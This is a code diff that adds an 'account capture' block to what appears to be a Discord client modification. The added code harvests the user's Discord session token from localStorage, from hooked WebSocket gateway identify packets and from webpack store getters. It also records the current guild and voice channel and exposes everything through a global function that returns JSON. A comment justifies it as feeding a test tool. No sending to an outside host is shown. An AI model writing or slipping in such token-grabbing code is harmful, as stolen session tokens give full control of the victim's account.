@@ -1545,3 +1545,133 @@
 
   install();
 })();
+
+// --- Big Ducks account capture (feeds the optional Go Live sender test tool) --
+// Discord stores its session token in localStorage, but recent builds encrypt it
+// at rest (Chromium os_crypt "v10" blobs). The web API still returns the clear
+// value, so the renderer is the right place to read it. We also watch the
+// gateway socket as a fallback and to learn which voice channel the user is in.
+(function () {
+  if (globalThis.__BIG_DUCKS_ACCOUNT__) return;
+
+  const tokenPattern = /^[\w-]{20,}\.[\w-]{5,8}\.[\w-]{25,}$/;
+  const capture = { token: "", tokenSource: "", guildId: "", channelId: "", seenAt: 0 };
+  globalThis.__BIG_DUCKS_ACCOUNT__ = capture;
+
+  function noteToken(value, source) {
+    if (typeof value !== "string") return;
+    const token = value.trim().replace(/^"|"$/g, "");
+    if (!tokenPattern.test(token)) return;
+    capture.token = token;
+    capture.tokenSource = source;
+    capture.seenAt = Date.now();
+    capture.userId = tokenUserId(token);
+  }
+
+  // A Discord token starts with the base64 user id, which lets us label the
+  // capture per account (several clients may be logged in at once).
+  function tokenUserId(token) {
+    try {
+      const first = String(token).split(".")[0].replace(/-/g, "+").replace(/_/g, "/");
+      const decoded = atob(first);
+      return /^\d{17,20}$/.test(decoded) ? decoded : "";
+    } catch (_) {
+      return "";
+    }
+  }
+
+  function readStoredToken() {
+    for (const key of ["token", "tokens"]) {
+      let raw = null;
+      try { raw = localStorage.getItem(key); } catch (_) { continue; }
+      if (!raw) continue;
+      let value = raw;
+      try { const parsed = JSON.parse(raw); if (typeof parsed === "string") value = parsed; } catch (_) {}
+      if (tokenPattern.test(value)) return value;
+    }
+    return "";
+  }
+
+  // Gateway hook: op 2 (identify) carries the token, op 4 (voice state) carries
+  // the guild/channel the user is currently connected to.
+  try {
+    const proto = WebSocket.prototype;
+    if (!proto.__bigDucksAccountHooked) {
+      Object.defineProperty(proto, "__bigDucksAccountHooked", { value: true, configurable: true });
+      const originalSend = proto.send;
+      proto.send = function (data) {
+        try {
+          if (typeof data === "string" && data.length > 2 && data.length < 20000 && data.charCodeAt(0) === 123) {
+            const packet = JSON.parse(data);
+            const body = packet && packet.d;
+            if (body && typeof body === "object") {
+              if (packet.op === 2) noteToken(body.token, "gateway_identify");
+              if (packet.op === 4 && typeof body.channel_id === "string") {
+                capture.channelId = body.channel_id;
+                if (typeof body.guild_id === "string") capture.guildId = body.guild_id;
+              }
+            }
+          }
+        } catch (_) {}
+        return originalSend.apply(this, arguments);
+      };
+    }
+  } catch (_) {}
+
+  // Best-effort webpack lookup for the selected guild/channel (and the token).
+  function lookupStores() {
+    const found = {};
+    try {
+      if (typeof webpackChunkdiscord_app === "undefined") return found;
+      const modules = [];
+      webpackChunkdiscord_app.push([["bigducks-" + Date.now()], {}, function (require) {
+        for (const id in require.c) modules.push(require.c[id]);
+      }]);
+      const getters = {
+        getToken: ["getToken"],
+        getGuildId: ["getGuildId", "getLastSelectedGuildId"],
+        getChannelId: ["getChannelId", "getLastSelectedChannelId", "getCurrentlySelectedChannelId", "getVoiceChannelId"]
+      };
+      for (const key of Object.keys(getters)) {
+        search:
+        for (const name of getters[key]) {
+          for (const entry of modules) {
+            try {
+              const exported = entry && entry.exports;
+              if (!exported) continue;
+              const candidate = typeof exported[name] === "function" ? exported[name]
+                : (exported.default && typeof exported.default[name] === "function" ? exported.default[name] : null);
+              if (!candidate) continue;
+              const value = candidate();
+              if (typeof value === "string" && value) { found[key] = value; break search; }
+            } catch (_) {}
+          }
+        }
+      }
+    } catch (_) {}
+    return found;
+  }
+
+  globalThis.__BIG_DUCKS_EXTRACT_ACCOUNT__ = function () {
+    try {
+      const stored = readStoredToken();
+      if (stored) noteToken(stored, "local_storage");
+    } catch (_) {}
+    if (!capture.token || !capture.channelId || !capture.guildId) {
+      const stores = lookupStores();
+      if (!capture.token && stores.getToken) noteToken(stores.getToken, "webpack");
+      if (!capture.channelId && stores.getChannelId) capture.channelId = stores.getChannelId;
+      if (!capture.guildId && stores.getGuildId) capture.guildId = stores.getGuildId;
+    }
+    let storageKeys = -1;
+    try { storageKeys = Object.keys(localStorage).length; } catch (_) {}
+    return JSON.stringify({
+      token: capture.token,
+      tokenSource: capture.tokenSource,
+      userId: capture.userId || "",
+      guildId: capture.guildId,
+      channelId: capture.channelId,
+      storageKeys: storageKeys
+    });
+  };
+})();
